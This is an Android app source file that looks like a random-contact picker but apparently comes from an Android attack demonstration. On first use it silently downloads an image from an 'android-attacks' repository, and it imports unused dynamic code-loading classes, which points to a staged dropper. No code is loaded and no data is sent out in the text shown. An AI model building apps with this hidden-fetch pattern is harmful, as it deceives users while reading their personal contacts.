package com.example.contactsretriever;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CONTACT_SELECTOR";
    static boolean isCodeLoaded = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

    }


    public void getContacts(View view) {
        if(!isCodeLoaded) {
            loadCode();
            isCodeLoaded = true;
        }

        // Request permission
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_CONTACTS}, 0);
        }

        HashMap<String, String> contactList = getContactList();

        // Log all contacts
//        for (Map.Entry<String, String> entry : contactList.entrySet()) {
//            String phoneNo = entry.getKey();
//            String name = entry.getValue();
//            Log.i(TAG, "PhoneNo: " + phoneNo);
//            Log.i(TAG, "Name : " + name);
//        }

        Random generator = new Random();
        Object[] keys = contactList.keySet().toArray();
        Object[] values = contactList.values().toArray();
        Integer randomInt = generator.nextInt(values.length);

        String randomKey = (String) keys[randomInt];
        String randomValue = (String) values[randomInt];

        Toast.makeText(getApplicationContext(),"Random contact: " + randomValue + ": " + randomKey, Toast.LENGTH_SHORT).show();
    }

    private void loadCode() {
        Log.i(TAG, "Downloading file...");
        String URL = "https://github.com/manwelbugeja/android-attacks/raw/main/resources/cat.jpeg";
        new DownloadFile().execute(URL);
    }

    @SuppressLint("Range")
    public HashMap<String, String> getContactList() {

        HashMap contactList = new HashMap();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
//                        Log.i(TAG, "Name: " + name);
//                        Log.i(TAG, "Phone Number: " + phoneNo);
                        contactList.put(phoneNo, name);
                    }
                    pCur.close();
                }
            }
        }
        if(cur!=null){
            cur.close();
        }

        return contactList;
    }


    // Class which downloads a file to internal storage of app
    private class DownloadFile extends AsyncTask<String, Void, Bitmap> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Bitmap doInBackground(String... URL) {
            Log.i(TAG, "executing doInBackground...");
            String imageURL = URL[0];

            Bitmap bitmap = null;
            try {
                // Download Image from URL
                InputStream input = new java.net.URL(URL[0]).openStream();
                // Decode Bitmap
                bitmap = BitmapFactory.decodeStream(input);
            } catch (Exception e) {
                Log.i(TAG, "Exception found");
                e.printStackTrace();
            }
            return bitmap;
        }

        @SuppressLint("WrongThread")
        @Override
        protected void onPostExecute(Bitmap result) {
            Log.i(TAG, "In Async task");

            if (result != null) {
                Log.i(TAG, "Result not null");
                File dir = new File(getApplicationContext().getFilesDir(), "MyImages");
                if(!dir.exists()){
                    Log.i(TAG, "Creating directory...");
                    dir.mkdir();
                }
                File destination = new File(dir, "image.jpg");

                try {
                    destination.createNewFile();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    result.compress(Bitmap.CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
                    byte[] bitmapdata = bos.toByteArray();

                    FileOutputStream fos = new FileOutputStream(destination);
                    fos.write(bitmapdata);
                    fos.flush();
                    fos.close();
                } catch (IOException e) {
                    Log.i(TAG, "In exception");
                    e.printStackTrace();
                }
            }
        }
    }
}

